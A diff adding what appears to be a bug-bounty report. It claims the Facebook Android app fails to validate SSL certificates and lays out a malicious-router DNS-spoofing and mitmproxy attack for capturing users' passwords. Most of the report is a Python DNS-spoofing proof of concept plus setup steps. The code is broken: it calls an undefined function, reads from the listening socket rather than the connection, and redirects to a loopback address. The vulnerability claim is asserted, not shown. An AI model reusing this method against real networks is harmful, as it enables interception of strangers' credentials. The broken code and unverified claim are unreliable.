@@ -1,0 +1,88 @@
+Description
+===
+[Technical details of the bug]
+The facebook Android app does not validate the SSL certificate which makes it vulnerable to DNS spoofed transparent proxy. Here, a malicious router redirects DNS requests to a server which uses a public DNS to determine ip for all other sites except facebook.com and send a modified IP where a transparent redirect proxy is setup. This makes the content pass through the proxy and easy for the attacker to capture critical information such as passwords.
+
+Impact
+===
+[What data can you access? How many users are affected?]
+Currently we can access all requests and responses sent from facebook servers to the transparent proxy and from and fro the proxy to the user who connects to the infected wifi network.
+
+
+
+
+Setup
+===
+[Any users, accounts, pages, groups, etc needed]
+[Details of specific device/OS/browser versions]
+
+Steps
+===
+1. .Setup a script on a machine with ip x:
+
+import binascii
+import socket
+import time
+
+domain_to_watch = "facebook.com"
+desired_ip = "7F858585" # Desired ip in hex
+dns_server = "8.8.4.4"
+# This is the port that we will be connecting on to on dns_server
+dns_server_port = 53
+
+def send_udp_message(message, address, port):
+    """
+        send_udp_message sends a message to UDP server port: port
+        at ip address:address and returns a decoded response
+    """
+    message = message.replace(" ", "").replace("\n", "")
+    server_address = (address, port)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.sendto(binascii.unhexlify(message), server_address)
+        data, _ = sock.recvfrom(4096)
+    finally:
+        sock.close()
+    return binascii.hexlify(data).decode("utf-8")
+
+def modify(response):
+    """ 
+        Modify modifies the response and changes the ip address
+        in the resonse to desired_ip
+    """
+    modified_response = response[:-4] + desired_ip
+    modified_response = format_hex(modified_response)
+    return modified_response
+
+def main():
+    """
+        Startup the server and start listening at port no: 53.
+        Sends a modified response if the DNS request was for the
+        target_domain or else send an umodified response as got from
+        the DNS server
+    """
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(('localhost', 53))
+    server_socket.listen(5)
+    conn, addr = server_socket.accept()
+
+    # infinite loop
+    while 1:
+        data = server_socket.recv(512).decode("utf-8")
+        response = send_udp_message(data, dns_server, dns_server_port)
+        if(domain_to_watch in data):
+            response = modify(response)
+        server_socket.send(response)
+
+if __name__ == "__main__":
+    main()
+
+2. Run this script on x
+3. Configure router's DNS to x
+4. Configure mitmproxy (reverse proxy) on systemwith ip 7F858585 (hex value)
+5. Run wireshark and decrypt the data using the key from mitmproxy
+
+For an user to get infected,
+1. Connect to an infected wifi netowrk.
+2. Open facebook android app 
